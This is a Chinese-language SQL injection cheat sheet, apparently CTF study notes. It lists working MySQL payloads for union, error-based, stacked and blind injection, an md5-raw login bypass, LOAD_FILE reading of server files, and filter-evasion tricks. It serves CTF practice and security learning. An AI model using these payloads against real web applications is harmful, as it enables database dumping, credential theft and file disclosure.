## SQLi

#### 字符型

测试步骤：

payload为`'#`不会报错

#### 整数型

payload为`1'`会报错

### 注入姿势：

#### 堆叠注入

类似Linux下的命令注入

例：

```sql
1';alter table `words` rename to `word`;alter table `1919810931114514` rename to `words`;alter table words change flag id varchar(100);
```



#### HANDLER[TABLE]OPEN语句

MySQL 专用的语句，并没有包含到SQL标准中。

HANDLER [表名] OPEN;语句打开一个表，使其可以使用后续HANDLER [表名] READ；该表对象未被其他会话共享，并且在会话调用HANDLER [表名] CLOSE;或会话终止之前不会关闭

```sql
1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere  close;#
```



#### union 注入

要注意观察回显的位置，选择在哪里注入sql很重要

```sql
1'union selcet 1,2,3%23
1'order by 3%23
1'union select 1,2,database()%23
#查库
1'union select 1,2,group_concat(schema_name)from(information_schema.schemata)%23
#查表
1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
#查字段
1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="geekuser"%23#表名有单引号
```

#### 报错注入

```sql
password=1'OR(updatexml(1,concat('~',database(),'~'),1))%23
```

```sql
1'or(updatexml(1,concat('~''~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),'~'),1))%23
```

```sql
#报错注入对回显有字数限制，所以采用左右显示以补全flag
admin'or(updatexml(1,concat('~',(select(group_concat((right(password,25))))from(H4rDsq1)),'~'),1))%23
```

#### 布尔盲注

```sql
if(ascii(substr(database(),1,1))=101,1,2)
0||ascii(substr(database()/**/from/**/1/**/for/**/1))
```

#### 查询时产生新的行列进行匹配绕过（通常后台分为两次查询）

**1.group by 子句：rollup**，在group by产生结果时，会对结果进行汇总，默认情况下会生成一个NULL值作为统计名

```sql
SELECT 
    warehouse, SUM(quantity)
FROM
    inventory
GROUP BY ROLLUP(warehouse);
```

产生：

```tex
warehouse              SUM(quantity)
San Fransisco          560
San Jose               650
Null                   1210
```

[CTFshow-web10](https://blog.csdn.net/weixin_46439278/article/details/109555667)

payload:

对查询出来的用户名进行汇总

```sql
admin'or/**/1=1/**/group/**/by/**/password/**/with/**/ROLLUP#
```



#### Mysql中的MD5函数

 md5(string,raw)

raw：可规定16进制(false)还是二进制输出(true)。有一道题：[CTFshow-web9](https://blog.csdn.net/March97/article/details/81222922)

```sql
select * from 'admin' where password=md5($pass,true)
```

```
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```

如果raw为true，则返回的这个原始二进制不是普通的二进制（0，1），而是 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。

#### Mysql中的loadfile函数

 在MySQL中，LOAD_FILE()函数读取一个文件并将其内容作为字符串返回。

所以如果我已知存在GET型注入和目标文件，可以尝试使用这个函数去读取flag

```sql
?no=-1/**/union/**/%20select/**/1,load_file('/var/www/html/flag.php')%20,3,4#
```



### 过滤绕过：

#### 空格

```sql
1.url编码：%0a,%0b,%0c,%0d,%09,%a0,/**/
2.使用括号包裹
```

#### 单引号转义

[NCTF2019SQLi](https://blog.csdn.net/wuyaowangchuan/article/details/114362816)

在一些情况下，单引号被过滤了，那么这时候我们可以传入`\`字符，进行尝试

eg:

```sql 
#有如下sql语句
select * from table where name='$_GET[name]' and passwd='$_GET[passwd]'
```

那么我们传入`name=\&passwd=||/**/passwd/**/regexp/**/"^a"%00`，上面的语句会变为

```sql
select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/"^a";
```

#### 等号=

使用like绕过

#### 使用``对关键字绕过

